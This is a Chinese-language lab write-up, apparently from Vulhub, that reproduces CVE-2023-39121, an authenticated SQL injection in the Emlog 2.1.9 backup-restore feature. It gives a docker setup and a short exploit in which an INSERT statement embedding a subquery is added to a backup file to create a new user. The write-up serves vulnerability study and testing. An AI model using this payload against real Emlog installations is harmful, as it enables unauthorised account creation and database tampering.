# Emlog data.php 后台SQL注入漏洞（CVE-2023-39121）

Emlog 是一款开源博客系统。该漏洞存在于数据备份/恢复功能中，由于输入验证不充分，攻击者可通过特制的备份文件执行任意 SQL 语句。

参考链接：

- <https://github.com/safe-b/CVE/issues/1#issue-1817133689>
- <https://www.emlog.net/docs/install/install_docker/>
- <https://hub.docker.com/layers/emlog/emlog/pro-latest-php7.4-apache/images/sha256-55bcc4861e1cc99ad79505be05ca3f3e5d9bb5dd16b8f2edc6ae62f7315cb8df>

## 漏洞环境

执行如下命令启动一个emlog2.1.9版本服务器：

```
docker compose up -d
```

环境启动后，访问`http://your-ip/install.php`会跳转到安装页面。注册一个用户名、密码，然后安装。完成之后，登录后台管理界面：

## 漏洞利用

1. 点击系统->数据->开始备份

   ![image-20250620130109114](https://github.com/vulhub/vulhub/emlog/CVE-2023-39121/1.png)

2. 发现下载了一个sql文件

   ![image-20250620130800739](https://github.com/vulhub/vulhub/emlog/CVE-2023-39121/2.png)

3. 打开sql文件，添加一条sql语句（插入一个用户为例）

   ```
   INSERT INTO emlog_user VALUES('110','','$P$BnTaZnToynOoAVP6T/MiTsZc9ZAQNg.',(select user()),'writer','n','','123@qq.com','','','0','1687261845','1687261845');
   ```

   ![image-20250620131017485](https://github.com/vulhub/vulhub/emlog/CVE-2023-39121/3.png)

4. 将刚才修改的sql文件导入

   ![image-20250620131122459](https://github.com/vulhub/vulhub/emlog/CVE-2023-39121/4.png)

5. 发现新增了一个用户，说明sql注入成功

   ![image-20250620131307794](https://github.com/vulhub/vulhub/emlog/CVE-2023-39121/5.png)

